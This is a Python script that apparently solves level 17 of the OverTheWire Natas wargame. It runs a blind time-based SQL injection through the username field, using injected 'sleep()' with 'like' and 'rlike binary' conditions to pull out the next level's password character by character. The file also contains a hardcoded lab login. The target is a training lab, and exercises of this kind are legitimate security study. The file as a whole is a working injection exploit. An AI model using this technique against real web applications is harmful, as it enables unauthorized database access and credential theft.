#!/usr/bin/env python3

import requests
from requests.auth import HTTPBasicAuth


sleep_time = 1
s = requests.Session()
s.auth = HTTPBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
url = 'http://natas17.natas.labs.overthewire.org/?debug'


def get_password_chars():
    filtered_chars = ''
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    print('Looking for password char set...')
    for char in chars:
        data = {'username': f'natas18" and password like binary "%{char}%" and sleep({sleep_time}) #'}
        resp = s.post(url, data=data)
        # print(f'response time: {resp.elapsed.seconds}')

        if resp.elapsed.seconds >= sleep_time:
            filtered_chars += char
            print(f'The password contains: {filtered_chars}')

    return filtered_chars


def get_password(filtered_chars):
    password = ''
    for i in range(32):
        print(f'Looking for position {i}...')

        for char in filtered_chars:
            data = {'username': f'natas18" and password rlike binary "^{password}{char}" and sleep({sleep_time}) #'}
            resp = s.post(url, data=data)

            # print(f'response time: {resp.elapsed.seconds}')
            if resp.elapsed.seconds >= sleep_time:
                password += char
                print(password)
                break

    return password


# Step 1: Find out what chars the password contains
filtered_chars = get_password_chars()

# Step 2: Find out the password by ordering the chars found in step 1
password = get_password(filtered_chars)
print(f'The password: {password}')
